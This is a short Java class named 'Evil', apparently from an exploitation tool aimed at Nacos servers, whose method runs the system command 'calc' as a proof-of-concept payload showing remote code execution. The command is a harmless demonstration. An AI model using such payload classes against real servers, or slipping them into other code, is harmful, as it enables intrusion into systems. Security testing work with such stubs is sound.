package org.fasnow.mutiple.model.nacos;

import java.io.IOException;

public class Evil {
    public static void _main(String[] args){
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
